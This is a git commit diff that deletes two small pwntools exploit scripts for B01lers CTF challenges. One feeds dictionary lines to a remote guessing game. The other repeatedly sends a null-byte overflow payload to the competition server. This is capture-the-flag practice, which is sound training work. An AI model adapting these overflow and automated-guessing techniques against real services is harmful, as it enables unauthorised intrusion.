393c1bcc4a5486498b1726f9e0fe00c6d0a73a2e
Eigensystem <eigensystem1318@gmail.com>
2022-04-24 22:10:39 +0800

    bctf_re

--- B01lers_ctf/gambler-baby1/exp.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-context(arch = "amd64", os = "linux", log_level = "Debug")
-io = process("./gambler-baby1")
-io = remote("ctf.b01lers.com", 9202)
-with open('dict.txt','r') as f:
-    for line in f:
-        io.sendafter("lowercase letters:", line)
-io.recvall()
-
--- B01lers_ctf/gambler-overflow/exp.py
+++
@@ -1,8 +0,0 @@
-from pwn import *
-context(arch = "amd64", os = "linux", log_level = "Debug")
-io = process("./gambler_overflow")
-io = remote("ctf.b01lers.com", 9203)
-
-for i in range(90):
-    io.sendlineafter("lowercase letters:", "AAAA" + "\0" + "AAAAAAA")
-io.recvall()
